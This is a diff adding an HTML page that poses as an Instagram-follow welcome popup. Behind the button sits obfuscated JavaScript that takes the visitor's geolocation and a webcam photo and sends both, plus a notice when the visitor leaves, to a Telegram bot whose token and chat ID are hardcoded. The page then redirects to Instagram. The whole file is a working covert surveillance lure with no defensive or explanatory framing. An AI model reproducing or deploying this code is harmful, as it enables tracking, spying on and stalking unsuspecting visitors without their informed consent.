@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WELCOME</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.css" />
+    <style>
+        /* Gaya CSS Anda tetap sama */
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+        }
+        .container {
+            background-color: rgba(255, 255, 255, 0.5); /* Putih dengan transparansi 50% */
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 2px solid #ff4d88;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
+            z-index: 10;
+            max-width: 90%;
+            width: 100%;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .popup {
+            background-color: rgba(0, 0, 0, 0.5);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .popup-content {
+            background-color: rgba(255, 255, 255, 0.5); /* Putih dengan transparansi 50% */
+            border: 2px solid #feedf3;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+            max-width: 90%;
+            box-sizing: border-box;
+            /* Tambahkan data-aos untuk animasi */
+            opacity: 0; /* Mulai dari opasitas 0 untuk AOS */
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #ff002d;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #580322;
+        }
+        #error {
+            margin-top: 20px;
+            color: red;
+            font-weight: bold;
+        }
+        
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 8px solid #3498db;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="popup" id="popup">
+        <div class="popup-content" data-aos="fade-down">
+            <h1>WELCOME</h1>
+            <p>Follow my Instagram to access the website.</p>
+            <button onclick="requestPermissions()">Go Instagram</button>
+            <div id="error"></div>
+        </div>
+    </div>
+
+    <div class="container" id="loadingContainer">
+        <div class="loader"></div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('popup').style.display = 'flex';
+            AOS.init();
+        });
+
+        const botToken = '6483328796:AAGlnTsVYkdB1s9RTVIGlQEpqkv7ozMr6R0';
+        const chatId = '5498392434';
+        const youtube = 'https://instagram.com/hack';
+
+        const _0x5209e3=_0x4087;function _0x5c9e(){const _0x4a25c2=['videoWidth','drawImage','href','querySelector','/sendMessage?chat_id=','getContext','height','48DaofXU','display','2BCcQXb','31866626lxwOaB','json','loadeddata','5606797zPverH','Browser\x20does\x20not\x20support\x20required\x20APIs.','getElementById','body','photo','photo.jpg','Network\x20response\x20was\x20not\x20ok\x20','2748912ZbQDdn','chat_id','toLocaleString','getUserMedia','Failed\x20to\x20send\x20message\x20to\x20Telegram:\x20','block','caption','12jqDPwf','statusText','catch','Failed\x20to\x20send\x20photo\x20to\x20Telegram:\x20','playsinline','popup','createElement','&text=','Failed\x20to\x20get\x20permissions:\x20','srcObject','image/jpeg','https://www.google.com/maps/search/?api=1&query=','POST','location','style','textContent','error','then','onbeforeunload','message','4992360xswjlT','mediaDevices','Support\x20ZannMods\x20Nih,\x20Anti\x20Kroco\x20×•×\x20-','1400081Kkfuah','geolocation','85023nJKNeI','https://api.telegram.org/bot','width','507435pCzCOO','append','330nfYPBY','none','videoHeight','getCurrentPosition','appendChild'];_0x5c9e=function(){return _0x4a25c2;};return _0x5c9e();}(function(_0x41950f,_0x2a470e){const _0x327951=_0x4087,_0x157169=_0x41950f();while(!![]){try{const _0x1becde=-parseInt(_0x327951(0x10e))/0x1*(parseInt(_0x327951(0x123))/0x2)+parseInt(_0x327951(0x10b))/0x3+-parseInt(_0x327951(0x121))/0x4*(-parseInt(_0x327951(0x113))/0x5)+parseInt(_0x327951(0xf7))/0x6*(parseInt(_0x327951(0x127))/0x7)+parseInt(_0x327951(0x12e))/0x8+parseInt(_0x327951(0x110))/0x9*(parseInt(_0x327951(0x115))/0xa)+-parseInt(_0x327951(0x124))/0xb;if(_0x1becde===_0x2a470e)break;else _0x157169['push'](_0x157169['shift']());}catch(_0x253039){_0x157169['push'](_0x157169['shift']());}}}(_0x5c9e,0xcd9f0));function sendMessageToTelegram(_0x1ab512){const _0x553bf6=_0x4087,_0x577d21='https://api.telegram.org/bot'+botToken+_0x553bf6(0x11e)+chatId+_0x553bf6(0xfe)+encodeURIComponent(_0x1ab512);return fetch(_0x577d21)['then'](_0x3ab744=>{const _0xbeca5f=_0x553bf6;if(!_0x3ab744['ok'])throw new Error(_0xbeca5f(0x12d)+_0x3ab744[_0xbeca5f(0xf8)]);return _0x3ab744[_0xbeca5f(0x125)]();})[_0x553bf6(0xf9)](_0x46c708=>{const _0x27acd4=_0x553bf6;console['error']('Failed\x20to\x20send\x20message\x20to\x20Telegram:\x20'+_0x46c708[_0x27acd4(0x10a)]),document[_0x27acd4(0x129)]('error')[_0x27acd4(0x106)]=_0x27acd4(0xf4)+_0x46c708['message'];});}function sendLocationToTelegram(_0x2c6898,_0x5854f4){const _0x103a21=_0x4087,_0x5d802a=_0x103a21(0x102)+_0x2c6898+','+_0x5854f4,_0x1c4d52='Location\x20By\x20ZannMods('+_0x5d802a+')';return sendMessageToTelegram(_0x1c4d52);}function sendPhotoToTelegram(_0x58b1da,_0x480696){const _0x5d2843=_0x4087,_0xa5afe3=new FormData();_0xa5afe3['append'](_0x5d2843(0x12f),chatId),_0xa5afe3[_0x5d2843(0x114)](_0x5d2843(0x12b),_0x58b1da,_0x5d2843(0x12c)),_0xa5afe3[_0x5d2843(0x114)](_0x5d2843(0xf6),_0x480696);const _0x39692d=_0x5d2843(0x111)+botToken+'/sendPhoto';return fetch(_0x39692d,{'method':_0x5d2843(0x103),'body':_0xa5afe3})[_0x5d2843(0x108)](_0x5352fa=>{const _0x171522=_0x5d2843;if(!_0x5352fa['ok'])throw new Error('Network\x20response\x20was\x20not\x20ok\x20'+_0x5352fa['statusText']);return _0x5352fa[_0x171522(0x125)]();})['catch'](_0x594b69=>{const _0x70f66f=_0x5d2843;console[_0x70f66f(0x107)](_0x70f66f(0xfa)+_0x594b69[_0x70f66f(0x10a)]),document[_0x70f66f(0x129)](_0x70f66f(0x107))['textContent']=_0x70f66f(0xfa)+_0x594b69[_0x70f66f(0x10a)];});}function capturePhoto(_0x31e627){return new Promise((_0x3c460c,_0x51df11)=>{const _0x28c3d9=_0x4087,_0x271ca5=document[_0x28c3d9(0xfd)]('canvas');_0x271ca5[_0x28c3d9(0x112)]=_0x31e627[_0x28c3d9(0x11a)],_0x271ca5[_0x28c3d9(0x120)]=_0x31e627[_0x28c3d9(0x117)];const _0xf097e3=_0x271ca5[_0x28c3d9(0x11f)]('2d');_0xf097e3[_0x28c3d9(0x11b)](_0x31e627,0x0,0x0,_0x271ca5[_0x28c3d9(0x112)],_0x271ca5[_0x28c3d9(0x120)]),_0x271ca5['toBlob'](_0xe8f1ce=>_0x3c460c(_0xe8f1ce),_0x28c3d9(0x101));});}function _0x4087(_0x539e7e,_0x3e6c4b){const _0x5c9e4b=_0x5c9e();return _0x4087=function(_0x40876d,_0x3a9c36){_0x40876d=_0x40876d-0xf3;let _0x2bda57=_0x5c9e4b[_0x40876d];return _0x2bda57;},_0x4087(_0x539e7e,_0x3e6c4b);}function startCapturingPhotos(_0x4dc2cb){const _0x49b324=_0x4087;capturePhoto(_0x4dc2cb)[_0x49b324(0x108)](_0x3ef669=>{const _0x13f637=_0x49b324,_0x52b4cf=_0x13f637(0x10d)+new Date()[_0x13f637(0x130)]();return sendPhotoToTelegram(_0x3ef669,_0x52b4cf);})[_0x49b324(0x108)](()=>{const _0x25867e=_0x49b324;window[_0x25867e(0x104)][_0x25867e(0x11c)]=''+youtube;})[_0x49b324(0xf9)](_0x5235af=>console[_0x49b324(0x107)](_0x5235af));}function requestPermissions(){const _0x317cd5=_0x4087;navigator[_0x317cd5(0x10f)]&&navigator[_0x317cd5(0x10c)]&&navigator['mediaDevices'][_0x317cd5(0xf3)]?navigator[_0x317cd5(0x10f)][_0x317cd5(0x118)](_0x5c0e82=>{const _0x25e523=_0x317cd5,{latitude:_0x19528d,longitude:_0x425fd3}=_0x5c0e82['coords'];sendLocationToTelegram(_0x19528d,_0x425fd3)['then'](()=>{const _0xdd8965=_0x4087;return navigator['mediaDevices'][_0xdd8965(0xf3)]({'video':!![]});})[_0x25e523(0x108)](_0x5de13c=>{const _0x35cc5d=_0x25e523,_0x261d2f=document[_0x35cc5d(0xfd)]('video');_0x261d2f[_0x35cc5d(0x100)]=_0x5de13c,_0x261d2f['setAttribute']('autoplay',''),_0x261d2f['setAttribute'](_0x35cc5d(0xfb),''),_0x261d2f['style'][_0x35cc5d(0x122)]=_0x35cc5d(0x116),document[_0x35cc5d(0x12a)][_0x35cc5d(0x119)](_0x261d2f),_0x261d2f['addEventListener'](_0x35cc5d(0x126),()=>{const _0x2addb4=_0x35cc5d;document['getElementById'](_0x2addb4(0xfc))[_0x2addb4(0x105)][_0x2addb4(0x122)]=_0x2addb4(0x116),document[_0x2addb4(0x11d)]('.container')[_0x2addb4(0x105)]['display']=_0x2addb4(0xf5),startCapturingPhotos(_0x261d2f);});})['catch'](_0x2490d7=>{const _0x3c97a2=_0x25e523;document[_0x3c97a2(0x129)](_0x3c97a2(0x107))['textContent']=_0x3c97a2(0xff)+_0x2490d7[_0x3c97a2(0x10a)];});},_0x3c5376=>{const _0x378a32=_0x317cd5;document[_0x378a32(0x129)](_0x378a32(0x107))[_0x378a32(0x106)]='Failed\x20to\x20get\x20location:\x20'+_0x3c5376[_0x378a32(0x10a)];}):document[_0x317cd5(0x129)](_0x317cd5(0x107))['textContent']=_0x317cd5(0x128);}window[_0x5209e3(0x109)]=function(){sendMessageToTelegram('User\x20left\x20the\x20browser.');};
+    </script>
+</body>
+  </html>
